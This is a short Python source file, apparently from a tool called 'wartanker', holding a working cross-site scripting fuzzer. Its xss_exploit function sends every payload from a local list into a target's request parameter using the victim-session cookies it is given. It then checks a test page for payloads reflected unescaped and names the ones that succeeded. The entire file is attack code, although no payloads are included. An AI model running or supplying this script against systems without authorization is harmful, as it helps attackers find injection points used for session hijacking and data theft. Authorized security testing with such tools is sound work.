import requests

def get_source(URL, json=''):
    if not json:
        return requests.get(URL).text
    return requests.get(URL, json=json).text

def xss_exploit(method, URL, name, param, cookie, testURL):
    # met=True: get, met=False: post
    if (method[:1].lower() == 'g'):
        met = True
    else:
        met = False
    
    data = open('./wartanker/xss.data').readlines()
    data_len = len(data)
    for i in range (data_len):
        param[name] = data[i]
        if (met):
            requests.get(URL, cookies=cookie, params=param)
        else:
            requests.post(URL, cookies=cookie, data=param)
        
        res = requests.get(testURL, cookies=cookie).text
        print ('[*] trying ' + str(i + 1) + ' of ' + str(data_len))
        if data[i] in res:
            print ('[*] How about trying \'' + data[i] + '\'?')
            more = input('[*] Do you want more? [Y / N] ')
            if (more.lower() != 'y'):
                break
